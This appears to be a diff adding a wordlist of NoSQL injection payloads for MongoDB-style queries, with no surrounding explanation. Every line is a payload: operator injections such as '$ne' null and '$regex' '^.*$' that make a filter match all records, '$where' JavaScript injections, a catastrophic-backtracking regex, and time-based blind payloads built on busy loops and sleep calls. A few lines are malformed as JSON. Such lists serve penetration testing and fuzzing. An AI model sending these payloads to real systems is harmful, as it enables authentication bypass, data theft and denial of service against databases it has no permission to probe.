@@ -1,0 +1,30 @@
+{"id":{"$eq":true}}
+{"id":{"$eq":"true"}}
+{"id":{"$gt":""}}
+{"id":{"$ne":null}}
+{"id":{"$regex":"^.*$"}}
+{"id":{"$not":{"$size":1}}}
+{"_id":{"$gt":0}}
+{"_id":{"$lt":1000000}}
+{"id":{"$where":"function() { return true; }"}}
+{"id": {"$expr":{"$gt":[{"$length":"$id"}, 0]}}}
+{"id":{"$gte":0, "$lt":5}}
+{"id":{"$in":[1,2,3]}}
+{"id": {"$or":[{"id":1}, {"id":2}]}}
+{"id": {"$and":[{"id":{"$ne":3}}, {"id":{"$ne":4}}]}}
+{"id":{"$not":{"$lte":5}}}
+{"id": {"$nor":[{"id":1}, {"id":2}]}}
+{"id":{"$exists":true}}
+{"id":{"$type":"string"}}
+{"id": {"$text":{"$search":"test"}}}
+{"id":{"$mod":[4,0]}}
+{"id":{"$all":[1,2,3]}}
+{"id":{"$elemMatch":{"$eq":1}}}
+{"id": {"$regex": "^(a?){100}(a{100})$"}}
+{"id": {"$in": [Array(100).fill("a").map((_, i) => "a".repeat(i))]}}
+{"id": {"$where": "function() { var start = new Date(); do {var now = new Date();} while(now - start < 5000); return true; }"}}
+{"id": {"$where": "this.nonExistentField ? sleep(5000) : true"}}
+{"id": {"$where": "function() { var time = new Date().getTime(); while(new Date().getTime() < time + 3000); return true; }"}}
+{"id": {"$regex": ".*", "$options": "($where:this.id.length>1)"}}
+{"id": {"$not": {"$lt": 100, "$where": "function() { sleep(1000); return true; }"}}}
+{"id": {"$gt": 1, "$where": "function() { for(i=0;i<1000000;i++); return true; }"}}
